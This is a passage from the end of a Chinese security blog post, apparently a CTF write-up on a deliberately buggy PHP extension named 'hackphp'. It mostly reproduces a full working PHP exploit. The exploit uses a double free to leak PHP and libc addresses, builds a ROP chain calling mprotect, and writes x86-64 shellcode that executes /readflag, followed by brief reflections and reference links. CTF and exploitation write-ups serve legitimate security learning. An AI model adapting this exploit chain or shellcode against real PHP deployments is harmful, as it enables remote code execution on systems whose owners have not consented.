&#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 8;</span><br><span class="line">$data = $mprotect_addr;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 8;</span><br><span class="line">$data = $stack_addr+0x18;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$stack_addr += 0x18;</span><br><span class="line">$offset += 0x8;</span><br><span class="line"></span><br><span class="line">$shellcode = &quot;\x55\x48\x89\xE5\x48\x83\xEC\x30\x48\xB8\x2F\x72\x65\x61\x64\x66\x6C\x61\x48\x89\x45\xF0\x48\xC7\xC0\x67\x00\x00\x00\x48\x89\x45\xF8\x48\x8D\x7D\xF0\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05&quot;;</span><br><span class="line">$len = strlen($shellcode);</span><br><span class="line"></span><br><span class="line">//写shellcode</span><br><span class="line">for ($j=0;$j&lt;$len;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = $shellcode[$j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>至此，就完成了漏洞利用。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function u64($val) &#123;</span><br><span class="line">   $s = bin2hex($val);</span><br><span class="line">   $len = strlen($s);</span><br><span class="line">   $ans = &quot;0x&quot;;</span><br><span class="line">   for ($i=$len-2;$i&gt;=0;$i-=2) &#123;</span><br><span class="line">      $ans = $ans . substr($s,$i,2);</span><br><span class="line">   &#125;</span><br><span class="line">   return intval($ans,16);</span><br><span class="line">&#125;</span><br><span class="line">function p32($val) &#123;</span><br><span class="line">   $s = dechex($val);</span><br><span class="line">   $len = strlen($s);</span><br><span class="line">   $ans = &quot;&quot;;</span><br><span class="line">   for ($i=$len-2;$i&gt;=0;$i-=2) &#123;</span><br><span class="line">      $ans = $ans . substr($s,$i,2);</span><br><span class="line">   &#125;</span><br><span class="line">   return hex2bin($ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//double free</span><br><span class="line">hackphp_create(56);</span><br><span class="line">hackphp_delete();</span><br><span class="line"></span><br><span class="line">//$x and $dv now has same address</span><br><span class="line">$x = str_repeat(&quot;D&quot;,0x18);</span><br><span class="line">$dv = new DateInterval(&#x27;P1Y&#x27;);</span><br><span class="line"></span><br><span class="line">$dv_vtable_addr = u64($x[0x10] . $x[0x11] . $x[0x12] . $x[0x13] . $x[0x14] . $x[0x15] . $x[0x16] . $x[0x17]);</span><br><span class="line">echo sprintf(&quot;dv_vatble=0x%lx&quot;,$dv_vtable_addr);</span><br><span class="line">echo  &quot;\n&quot;;</span><br><span class="line">$dv_self_obj_addr = u64($x[0x20] . $x[0x21] . $x[0x22] . $x[0x23] . $x[0x24] . $x[0x25] . $x[0x26] . $x[0x27]) - 0x70;</span><br><span class="line">echo sprintf(&quot;dv_self_obj_addr=0x%lx&quot;,$dv_self_obj_addr);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">hackphp_create(0x60);</span><br><span class="line">$oob = str_repeat(&quot;D&quot;,0x40);</span><br><span class="line">hackphp_edit(&quot;\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff/readflag\x00&quot;);</span><br><span class="line">$oob_self_obj_addr = u64($oob[0x48] . $oob[0x49] . $oob[0x4a] . $oob[0x4b] . $oob[0x4c] . $oob[0x4d] . $oob[0x4e] . $oob[0x4f]) - 0xC0;</span><br><span class="line">echo sprintf(&quot;oob_self_obj_addr=0x%lx&quot;,$oob_self_obj_addr);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$offset = $dv_vtable_addr + 0x8 - ($oob_self_obj_addr + 0x18);</span><br><span class="line">function read64($oob,$addr) &#123;</span><br><span class="line">   /*if ($addr &lt; 0) &#123;</span><br><span class="line">      $addr = 0x10000000000000000 + $addr;</span><br><span class="line">   &#125;*/</span><br><span class="line">   return u64($oob[$addr+0x0] . $oob[$addr+0x1] . $oob[$addr+0x2] . $oob[$addr+0x3] . $oob[$addr+0x4] . $oob[$addr+0x5] . $oob[$addr+0x6] . $oob[$addr+0x7]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo sprintf(&quot;offset=0x%lx&quot;,$offset);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$date_object_free_storage_interval_addr = read64($oob,$offset+1);</span><br><span class="line">echo sprintf(&quot;date_object_free_storage_interval_addr=0x%lx&quot;,$date_object_free_storage_interval_addr);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$php_base = $date_object_free_storage_interval_addr - 0x23D790;</span><br><span class="line">$strlen_got = $php_base + 0xFFEEB8;</span><br><span class="line"></span><br><span class="line">$offset = $strlen_got - ($oob_self_obj_addr + 0x18) + 1;</span><br><span class="line">$strlen_addr = read64($oob,$offset);</span><br><span class="line">$libc_base = $strlen_addr - 0x18b660;</span><br><span class="line">$pop_rdi = $libc_base + 0x0000000000026b72;</span><br><span class="line">$pop_rsi = $libc_base + 0x0000000000026b70;</span><br><span class="line">$pop_rdx = $libc_base + 0x0000000000162866;</span><br><span class="line"></span><br><span class="line">$stack_ptr = $libc_base + 0x1ec440;</span><br><span class="line"></span><br><span class="line">$offset = $stack_ptr - ($oob_self_obj_addr + 0x18);</span><br><span class="line">$stack_addr = read64($oob,$offset);</span><br><span class="line">$mprotect_addr = $libc_base + 0x11BB00;</span><br><span class="line"></span><br><span class="line">echo sprintf(&quot;strlen_addr=0x%lx \n&quot;,$strlen_addr);</span><br><span class="line">echo sprintf(&quot;libc_base=0x%lx \n&quot;,$libc_base);</span><br><span class="line">echo sprintf(&quot;stack_addr=0x%lx \n&quot;,$stack_addr);</span><br><span class="line"></span><br><span class="line">$offset = $stack_addr - ($oob_self_obj_addr + 0x18);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ret_main_target = $php_base + 0x51d402;</span><br><span class="line">//搜索ROP的地址</span><br><span class="line">while (true) &#123;</span><br><span class="line">   $data = read64($oob,$offset);</span><br><span class="line">   //echo sprintf(&quot;0x%lx&quot;,$hackphp_so_addr &amp; 0xFFF);</span><br><span class="line">   //echo &quot;\n&quot;;</span><br><span class="line">   if (intval($data) == intval($ret_main_target) ) &#123;</span><br><span class="line">      echo &quot;found!&quot;;</span><br><span class="line">      break;</span><br><span class="line">   &#125;</span><br><span class="line">   $offset--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($pop_rsi &amp; 0xFF);</span><br><span class="line">   $pop_rsi = $pop_rsi &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 0x8;</span><br><span class="line">$data = 0x1000;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$offset += 0x10;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($pop_rdx &amp; 0xFF);</span><br><span class="line">   $pop_rdx = $pop_rdx &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 0x8;</span><br><span class="line">$data = 0x7;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 0x10;</span><br><span class="line"></span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($pop_rdi &amp; 0xFF);</span><br><span class="line">   $pop_rdi = $pop_rdi &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$offset += 8;</span><br><span class="line">$stack_addr = $offset + ($oob_self_obj_addr + 0x18);</span><br><span class="line"></span><br><span class="line">$data = $stack_addr ^ ($stack_addr &amp; 0xfff);</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 8;</span><br><span class="line">$data = $mprotect_addr;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 8;</span><br><span class="line">$data = $stack_addr+0x18;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$stack_addr += 0x18;</span><br><span class="line">$offset += 0x8;</span><br><span class="line"></span><br><span class="line">$shellcode = &quot;\x55\x48\x89\xE5\x48\x83\xEC\x30\x48\xB8\x2F\x72\x65\x61\x64\x66\x6C\x61\x48\x89\x45\xF0\x48\xC7\xC0\x67\x00\x00\x00\x48\x89\x45\xF8\x48\x8D\x7D\xF0\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05&quot;;</span><br><span class="line">$len = strlen($shellcode);</span><br><span class="line"></span><br><span class="line">//写shellcode</span><br><span class="line">for ($j=0;$j&lt;$len;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = $shellcode[$j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-感想"><a href="#0x04-感想" class="headerlink" title="0x04 感想"></a>0x04 感想</h2><p>第一次接触WEB PWN，突然觉得php语言的模块功能好灵活方便，WEB PWN也挺有趣。</p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p>[ PHP 内核与扩展开发系列] PHP 生命周期 —— 启动、终止与模式](<a target="_blank" rel="noopener" href="https://laravelacademy.org/post/7152.html">https://laravelacademy.org/post/7152.html</a>)<br><a target="_blank" rel="noopener" href="https://www.ligphp.com/post/75.html">PHP扩展之PHP的启动和停止</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dearmrli/p/6553542.html">php7扩展开发 一 获取参数</a><br><a href="https://github.com/php/php-src/blob/ef5164818576d75929834d9f0c15cdfc095f7139/ext/opcache/jit/zend_jit_helpers.c">php-src</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Security%20Conf/Hitcon/Hitcon-2016/1201%20R2%201500%20exploiting%20php7.pdf">PHP7 Memory Exploitation</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/ha1vk/tags/UAF/" rel="tag"># UAF</a>
+              <a href="/ha1vk/tags/PHP-PWN/" rel="tag"># PHP PWN</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/01/11/issue-1051017/" rel="prev" title="chrome issue 1051017 v8 逃逸">
+      <i class="fa fa-chevron-left"></i> chrome issue 1051017 v8 逃逸
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/03/17/CVE-2016-5168/" rel="next" title="Chrome Issue 659475(CVE-2016-5168)漏洞分析">
+      Chrome Issue 659475(CVE-2016-5168)漏洞分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PHP%E6%A8%A1%E5%9D%97%E7%9A%84%E7%BC%96%E5%86%99"><span class="nav-number">2.</span> <span class="nav-text">0x01 PHP模块的编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-number">2.1.</span> <span class="nav-text">模块基本语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82"><span class="nav-number">2.2.</span> <span class="nav-text">传参</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">2.3.</span> <span class="nav-text">测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-PHP%E6%A8%A1%E5%9D%97%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">0x02 PHP模块逆向分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-hackphp"><span class="nav-number">4.</span> <span class="nav-text">0x03 hackphp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞利用分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%84%9F%E6%83%B3"><span class="nav-number">5.</span> <span class="nav-text">0x04 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">6.</span> <span class="nav-text">0x05 参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
